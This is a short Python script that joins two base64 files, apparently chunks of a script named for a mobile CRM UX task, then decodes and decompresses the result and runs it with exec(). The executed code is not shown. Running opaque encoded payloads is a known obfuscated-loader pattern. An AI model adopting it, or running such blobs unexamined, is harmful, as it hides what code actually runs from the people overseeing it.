from pathlib import Path
import base64, zlib
payload = Path('scripts/chatgpt_mobile_crm_ux_part0.b64').read_text().strip() + Path('scripts/chatgpt_mobile_crm_ux_part1.b64').read_text().strip()
exec(zlib.decompress(base64.b64decode(payload)).decode('utf-8'))
